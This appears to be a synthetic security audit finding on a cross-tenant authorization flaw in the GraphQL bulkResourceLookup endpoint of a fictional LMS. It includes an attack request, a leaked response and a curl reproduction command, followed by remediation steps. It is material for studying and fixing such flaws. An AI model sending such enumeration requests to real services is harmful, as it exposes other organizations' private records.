# Security Analysis Report
**System:** LearnPath Assessment Platform
**Domain:** Education / EdTech LMS
**Example ID:** GQL-0316
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.9 | Batch/bulk lookup endpoint on `bulkResourceLookup` — single request enumerates LMS resources across all tenants using arbitrary ID arrays |

---

## Finding 1 — BOLA: Batch/Bulk Lookup Without Per-ID Ownership Check (Pattern 1.9)

### Summary
The `bulkResourceLookup` mutation on LearnPath Assessment Platform (`api.learnpath-assessment.example.com`) accepts a list of IDs without per-ID ownership checks. Per §5.0 Pattern 1.9, a single request can enumerate objects across all tenants — an attacker uses a `tenant-2956` token to retrieve LMS assessment records belonging to `tenant-5314` by submitting victim resource IDs in the bulk lookup array.

**Context.txt inconsistency (documented):** HAR mutation uses `bulkResourceLookup(ids: ["R-2316", "R-1316", "R-3316"])`, but the response key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`bulkResourceLookup`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning.

**Pattern:** 1.9 — Batch/bulk lookup endpoints (BOLA)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.learnpath-assessment.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.learnpath-assessment.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-2956

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2316\", \"R-1316\", \"R-3316\"]) { resourceId tenantId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Resource Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-5314",
      "ownerId": "other-user-29565314",
      "data": {
        "sensitiveField": "CONFIDENTIAL-29565314",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-2956`. Returned data belongs to: `tenant-5314`. Bulk cross-tenant LMS enumeration confirmed.

**Context.txt inconsistency:** HAR sends `bulkResourceLookup` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.learnpath-assessment.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2956" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2316\", \"R-1316\", \"R-3316\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-5314 LMS resources — bulk cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch on ID R-2316"}]}
```

### Remediation
1. In `bulkResourceLookup`: for each ID in the array, assert `fetched.tenantId === jwt.tenantId`. Reject or skip IDs belonging to other tenants.
2. Apply per-request rate limiting and maximum batch size to mitigate bulk enumeration.
3. Re-key Redis cache to include `tenantId`.
